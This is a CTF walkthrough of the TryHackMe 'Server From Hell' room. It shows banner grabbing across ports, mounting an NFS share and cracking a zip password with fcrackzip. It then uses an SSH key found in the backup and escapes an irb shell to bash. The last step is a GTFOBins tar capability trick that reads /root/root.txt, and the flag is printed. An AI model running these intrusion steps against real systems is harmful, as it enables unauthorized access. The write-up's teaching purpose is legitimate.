# TryHackMe-Server From Hell

> Abdullah Rizwan | 05:54 PM | 3rd November ,2020

## NMAP

```
Not shown: 94 closed ports
PORT      STATE SERVICE               VERSION
1/tcp     open  tcpmux?
| fingerprint-strings: 
|   NULL: 
|_    550 12345 0000000000000000000000000000000000000000000000000000000
3/tcp     open  compressnet?
| fingerprint-strings: 
|   NULL: 
|_    550 12345 0000000000000000000000000000000000000000000000000000000
4/tcp     open  unknown
| fingerprint-strings: 
|   NULL: 
|_    550 12345 0000000000000000000000000000000000000000000000000000000
6/tcp     open  unknown
........

There were many ports open in this box so can't really show how many ports were there
```

Looking at the description of the room it says about starting from `1337` ,so

## PORT 1337

`nc IP:1337`

```
Welcome traveller, to the beginning of your journey
To begin, find the trollface
Legend says he's hiding in the first 100 ports
Try printing the banners from the ports

```
This is the message we get when we connect to port 1337

I made a simple script to go over 100 ports and connect to it to grab banner


```
i=1
while [ $i -ne 100 ]
do 
	nc 10.10.173.96 $i
	i=$(( $i + 1 ))
done

```
<img src="https://imgur.com/X2RBWne.png"/>


## PORT 12345

```
nc 10.10.173.96 12345
NFS shares are cool, especially when they are misconfigured
It's on the standard port, no need for another scan
```

## PORT 2049

The default port of `nfs` share is 2049 so lets see if there are any shares that we can mount on our local machine

<img src="https://imgur.com/ZsfnVwC.png"/>

Now let's mount that share

<img src="https://imgur.com/SDYKjPV.png"/>

We only find a `backup.zip`

<img src="https://imgur.com/VVLeFOp.png"/>

But it asks for a password

<img src="https://imgur.com/PdxqCba.png"/>

### Fcrackzip

Now lets use this to bruteforce archive's password

```
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt backup.zip 


PASSWORD FOUND!!!!: pw == zxcvbnm
```
<img src="https://imgur.com/mqLJMVD.png"/>

But I can't get to extract the files becasue `read-only file system` , so I used GUI to view what was in these files

<img src="https://imgur.com/0aJE2Xt.png"/>

And I was able to grab the flag,hint and ssh private key.


Now `hint.txt` says

```
2500-4500
```

I tried to ssh into the box using `hades` private but ssh port was not on 22

<img src="https://imgur.com/PfSORcz.png"/>

From the results of the scan I searched for ssh with openssh client

<img src="https://imgur.com/mgG3s7s.png"/>

And was logged in :D

<img src="https://imgur.com/2j3o2wy.png"/>

```
 Welcome to hell. We hope you enjoy your stay!
 irb(main):001:0> puts 'hello'
hello
=> nil
irb(main):002:0> 

```

Now this `irb` is interactive ruby shell just like we get in python so in order to get a `/bin/bash` shell run 

```
exec '/bin/bash'
```

<img src="https://imgur.com/TagPPFG.png"/>

## Privilege Escalation

Now the room gives us a hint about `getcap` this command tells that which file or binary has capability to access almost anything on the system so run 

`getcap -r 2>/dev/null` (2>/dev/null ,here 2 just redirects Standard output error to null )


```
hades@hell:~$ getcap -r / 2>/dev/null
/usr/bin/mtr-packet = cap_net_raw+ep
/bin/tar = cap_dac_read_search+ep
```
Visiting `GTFOBINS`

https://gtfobins.github.io/gtfobins/tar/
```
hades@hell:~$ tar xf /root/root.txt -I '/bin/sh -c "cat 1>&2"'
thm{w0w_n1c3_3sc4l4t10n}
hades@hell:~$ 

```



